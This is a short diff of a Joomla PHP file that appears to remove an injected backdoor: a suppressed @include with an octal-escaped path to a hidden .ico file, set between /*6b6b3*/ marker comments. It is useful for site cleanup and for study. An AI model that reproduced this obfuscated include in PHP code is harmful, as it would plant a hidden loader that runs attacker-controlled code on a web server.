@@ -1,9 +1,4 @@
 <?php
-/*6b6b3*/
-
-@include "\057hom\145/us\145rs/\061/hi\150o.j\160-mo\152a/w\145b/s\157toc\150ika\057lib\162ari\145s/.\0672fa\1446c4\056ico";
-
-/*6b6b3*/
 /**
  * @package    Joomla.Site
  *
